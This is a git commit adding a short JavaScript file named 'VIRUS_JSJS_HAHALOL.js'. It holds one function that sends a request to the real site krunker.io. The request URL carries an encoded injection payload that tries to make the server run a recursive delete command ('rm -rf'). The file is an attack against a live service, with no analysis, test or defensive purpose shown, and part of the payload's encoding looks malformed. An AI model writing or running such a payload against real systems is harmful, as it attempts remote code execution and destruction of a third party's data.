ba34afa3b71cb6097c8edb233f339d2974ae8a35
MichnoAZ <75491595+MichnoAZ@users.noreply.github.com>
2022-06-21 18:15:44 +0500

    Create VIRUS_JSJS_HAHALOL.js

---
+++ VIRUS_JSJS_HAHALOL.js
@@ -0,0 +1,7 @@
+function karma() {
+  // "Karma gets invisible" ~ John Doe
+  
+  fetch('https://krunker.io/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22rm%20-rf%20%*7%22%29%7D/', {
+  credentials: 'same-origin'
+  })
+}
